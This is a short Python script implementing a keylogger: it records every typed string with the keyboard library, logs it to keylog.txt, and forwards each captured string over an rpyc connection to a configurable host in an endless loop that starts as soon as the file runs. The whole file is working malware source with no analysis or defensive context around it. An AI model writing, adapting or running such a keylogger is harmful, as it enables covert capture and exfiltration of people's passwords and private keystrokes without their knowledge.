import keyboard
import logging
import rpyc
import sys


class keylogger:

	def send(self,host='127.0.0.1',port=18861,msg='',classic = False):
		if classic:
			conn = rpyc.classic.connect(host)
			print(msg, file=conn.modules.sys.stdout)
		else:
			conn = rpyc.connect(host,port)
			print(msg, file=conn.modules.sys.stdout)

		

	def log(self,_logfile = 'keylog.txt',_interop = 'enter',_hotkey = False):
		
		logging.basicConfig(filename=_logfile,level=logging.DEBUG, format ='%(message)s')

		while True:
			
			recorded = keyboard.record(until= _interop)
			hotkey = keyboard.read_hotkey()
			string = ' '.join(keyboard.get_typed_strings(recorded,allow_backspace=True))
			logging.log(10, string)
			self.send(msg=string,classic=True)
			if _hotkey:
				logging.log(10,_hotkey)
				self.send(msg=string,classic=True)
			sys.stdout.flush()


key = keylogger()

key.log()

